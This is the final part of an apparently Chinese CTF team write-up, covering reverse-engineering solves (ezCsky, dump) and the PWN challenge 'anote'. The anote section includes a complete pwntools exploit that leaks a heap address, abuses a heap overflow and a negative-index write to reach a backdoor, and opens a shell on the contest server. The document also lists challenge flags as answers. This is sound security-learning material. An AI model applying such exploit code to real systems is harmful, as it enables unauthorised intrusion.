class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,<span class="number">0x03</span>,<span class="number">0x19</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x03</span>,<span class="number">0x4b</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x07</span>,<span class="number">0x02</span>,<span class="number">0x49</span>,<span class="number">0x4c</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x01</span>,<span class="number">0x51</span>,<span class="number">0x0c</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for k in range(len(data)):</span></span><br><span class="line"><span class="comment">#     data[k]=data[k]^key[k%7]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    data[i-<span class="number">1</span>]^=data[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[j]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="flag值：flag-d0f5b330-9a74-11ef-9afd-acde48001122"><a href="#flag值：flag-d0f5b330-9a74-11ef-9afd-acde48001122" class="headerlink" title="flag值：flag{d0f5b330-9a74-11ef-9afd-acde48001122}"></a>flag值：<font style="color:#000000;">flag{d0f5b330-9a74-11ef-9afd-acde48001122}</font></h4><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><h4 id="操作内容：-14"><a href="#操作内容：-14" class="headerlink" title="操作内容："></a>操作内容：</h4><p>（最可惜的一题，拿到附件测了两下就知道可以黑盒fuzz了，不是00情况多种的话，我手爆感觉能有血，呜呜呜），先拉到ida大概看了一下，属于是又臭又长，但是看见有命令行里的传参</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256575334-e740c953-0c69-45d5-aa77-bb0f1ca17f6b.png"></p>
<p>就测了两下，对照密文</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256530134-9723124f-4fef-46c8-8b28-9f22fc71574a.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1734256689818-025e92d7-9ce5-4df0-a3d4-10249722c748.png"></p>
<p>脑神经寻思紧绷，直接测所有可见字符就好了，奈何测上道题给我榨干了，爆破脚本不太会搓了，直接手撕，给所有可见字符编一下码，接下来就是体力活儿了</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256873375-7f6781e5-880f-4b54-a3b0-66ae4b51e51c.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> <span class="number">0x1C</span> <span class="number">0x1D</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x03</span> <span class="number">0x04</span> <span class="number">0x05</span> <span class="number">0x06</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x09</span> <span class="number">0x0A</span> <span class="number">0x0B</span> <span class="number">0x0C</span> <span class="number">0x0D</span> <span class="number">0x0E</span> <span class="number">0x0F</span> <span class="number">0x10</span> <span class="number">0x11</span> <span class="number">0x12</span> <span class="number">0x13</span> <span class="number">0x14</span> <span class="number">0x15</span> <span class="number">0x16</span> <span class="number">0x17</span> <span class="number">0x18</span> <span class="number">0x19</span> <span class="number">0x1A</span> <span class="number">0x1B</span> <span class="number">0x00</span> <span class="number">0x1E</span> <span class="number">0x1F</span> <span class="number">0x20</span> <span class="number">0x21</span> <span class="number">0x22</span> <span class="number">0x23</span> <span class="number">0x24</span> <span class="number">0x25</span> <span class="number">0x26</span> <span class="number">0x27</span> <span class="number">0x28</span> <span class="number">0x29</span> <span class="number">0x2A</span> <span class="number">0x2B</span> <span class="number">0x2C</span> <span class="number">0x2D</span> <span class="number">0x2E</span> <span class="number">0x2F</span> <span class="number">0x30</span> <span class="number">0x31</span> <span class="number">0x32</span> <span class="number">0x33</span> <span class="number">0x34</span> <span class="number">0x35</span> <span class="number">0x36</span> <span class="number">0x37</span> <span class="number">0x38</span> <span class="number">0x39</span> <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">flag&#123;MTczMDc?MzQ2Ng==&#125;</span><br><span class="line"><span class="comment">#上段中？部分不知道00的对应内容，最后在平台一个个试的最后结果是4（试出来之后不一会儿就给提示说是4了（乐））</span></span><br><span class="line">ABCDEFGHIJKL M NOPQRS T UVWXYZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">02030405060708090a0b0c0d0e0f101112131415161718191a1b</span><br><span class="line">A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1e1f202122232425262728292a2b2c2d</span><br><span class="line">a b c d e f g h i j k l m n o p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1E <span class="number">24</span> <span class="number">38</span> 0E <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0E 05 <span class="number">20</span> <span class="number">00</span> 0E <span class="number">37</span> <span class="number">12</span> 1D 0F <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">23291e24380e1520370e0520000e3712 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> <span class="number">00</span> 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> 1c 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">1c1d000000000000000000000100000002030405060708090a0b0c0d0e0f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag值：flag-MTczMDc4MzQ2Ng"><a href="#flag值：flag-MTczMDc4MzQ2Ng" class="headerlink" title="flag值：flag{MTczMDc4MzQ2Ng&#x3D;&#x3D;}"></a>flag值：flag{MTczMDc4MzQ2Ng&#x3D;&#x3D;}</h4><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><font style="color:black;">PWN</font></h2><h3 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h3><h4 id="操作内容：-15"><a href="#操作内容：-15" class="headerlink" title="操作内容："></a>操作内容：</h4><p>ida反编译不是给人看的，直接鸡爪启动，有add,show,edit三个功能，edit有堆溢出，可以读入40个字节，show会给出堆块的地址，并且有后门，edit可以输入负数，也就是说可以越界，并且有个call rax,根据偏移写入堆块地址，堆块中写入后门，getshell</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257626320-37017f92-e842-4901-8404-b4ad2375eef2.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257717486-12ab6437-768c-4bef-9a29-32a4cec41431.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257968913-c00eb899-1361-4c7d-abbd-88c5cf00e75d.png"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;39.105.123.22&quot;</span>,<span class="number">30938</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x080489CE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">k,size,fenshu</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(k))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    io.sendline(fenshu)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">heap_addr=<span class="built_in">int</span>(io.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x28</span>,p32(heap_addr-<span class="number">37000</span>)+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x21</span>)+p32(backdoor))</span><br><span class="line">edit(-<span class="number">8</span>,<span class="number">0x28</span>,p32(heap_addr+<span class="number">32</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257837929-d2e86824-da78-4436-ad97-31922f0bbb38.png"></p>
<h4 id="flag值：flag-7c66ca9e-6fdb-4ea1-8c91-e759ae505e87"><a href="#flag值：flag-7c66ca9e-6fdb-4ea1-8c91-e759ae505e87" class="headerlink" title="flag值：flag{7c66ca9e-6fdb-4ea1-8c91-e759ae505e87}"></a>flag值：flag{7c66ca9e-6fdb-4ea1-8c91-e759ae505e87}</h4>
    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1734523160354"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">一、战队信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">二、解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E5%AE%89%E5%85%A8"><span class="toc-number">2.1.</span> <span class="toc-text">WEB安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Safe-Proxy"><span class="toc-number">2.1.1.</span> <span class="toc-text">Safe_Proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-9cb84d61-9040-47d7-b5ef-4c88ffa6e317"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">flag值：flag{9cb84d61-9040-47d7-b5ef-4c88ffa6e317}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-web"><span class="toc-number">2.1.2.</span> <span class="toc-text">hello_web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-1"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-91a89c19-e322-4ceb-8789-0bbc09b033f5"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">flag值：flag{91a89c19-e322-4ceb-8789-0bbc09b033f5}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">威胁检测与网络流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">zeroshell_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-2"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">flag值：flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-2"><span class="toc-number">2.2.2.</span> <span class="toc-text">zeroshell_2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-3"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-c6045425-6e6e-41d0-be09-95682a4f65c4"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">flag值：flag{c6045425-6e6e-41d0-be09-95682a4f65c4}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-3"><span class="toc-number">2.2.3.</span> <span class="toc-text">zeroshell_3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-4"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-202-115-89-103"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">flag值：flag{202.115.89.103}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-4"><span class="toc-number">2.2.4.</span> <span class="toc-text">zeroshell_4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-5"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-nginx"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">flag值：flag{.nginx}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-5"><span class="toc-number">2.2.5.</span> <span class="toc-text">zeroshell_5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-6"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-11223344qweasdzxc"><span class="toc-number">2.2.5.2.</span> <span class="toc-text">flag值：flag{11223344qweasdzxc}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zeroshell-6"><span class="toc-number">2.2.6.</span> <span class="toc-text">zeroshell_6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-7"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-var-register-system-startup-scripts-nat-File"><span class="toc-number">2.2.6.2.</span> <span class="toc-text">flag值：flag{&#x2F;var&#x2F;register&#x2F;system&#x2F;startup&#x2F;scripts&#x2F;nat&#x2F;File}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinFT-1"><span class="toc-number">2.2.7.</span> <span class="toc-text">WinFT_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-miscsecure-com-192-168-116-130-443"><span class="toc-number">2.2.7.1.</span> <span class="toc-text">flag值：flag{miscsecure.com:192.168.116.130:443}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinFT-2"><span class="toc-number">2.2.8.</span> <span class="toc-text">WinFT_2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-8"><span class="toc-number">2.2.8.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-AES-encryption-algorithm-is-an-excellent-encryption-algorithm"><span class="toc-number">2.2.8.2.</span> <span class="toc-text">flag值：flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinFT-5"><span class="toc-number">2.2.9.</span> <span class="toc-text">WinFT_5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-9"><span class="toc-number">2.2.9.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC"><span class="toc-number">2.2.9.2.</span> <span class="toc-text">flag值：flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sc05-1"><span class="toc-number">2.2.10.</span> <span class="toc-text">sc05_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-10"><span class="toc-number">2.2.10.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-01DF5BC2388E287D4CC8F11EA4D31929"><span class="toc-number">2.2.10.2.</span> <span class="toc-text">flag值：flag{01DF5BC2388E287D4CC8F11EA4D31929}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kiwi"><span class="toc-number">2.2.11.</span> <span class="toc-text">Kiwi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-11"><span class="toc-number">2.2.11.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-memeallme"><span class="toc-number">2.2.11.2.</span> <span class="toc-text">flag值：flag{memeallme!}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6"><span class="toc-number">2.3.</span> <span class="toc-text">密码学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rasnd"><span class="toc-number">2.3.1.</span> <span class="toc-text">rasnd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-12"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-d50d53cd-e2ce-453b-b352-ab1385bd22af"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">flag值：flag{d50d53cd-e2ce-453b-b352-ab1385bd22af}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">逆向工程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezCsky"><span class="toc-number">2.4.1.</span> <span class="toc-text">ezCsky</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-13"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-d0f5b330-9a74-11ef-9afd-acde48001122"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">flag值：flag{d0f5b330-9a74-11ef-9afd-acde48001122}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump"><span class="toc-number">2.4.2.</span> <span class="toc-text">dump</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-14"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-MTczMDc4MzQ2Ng"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">flag值：flag{MTczMDc4MzQ2Ng&#x3D;&#x3D;}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#anote"><span class="toc-number">2.5.1.</span> <span class="toc-text">anote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9%EF%BC%9A-15"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">操作内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC%EF%BC%9Aflag-7c66ca9e-6fdb-4ea1-8c91-e759ae505e87"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">flag值：flag{7c66ca9e-6fdb-4ea1-8c91-e759ae505e87}</span></a></li></ol></li></ol></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":350,"height":750},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>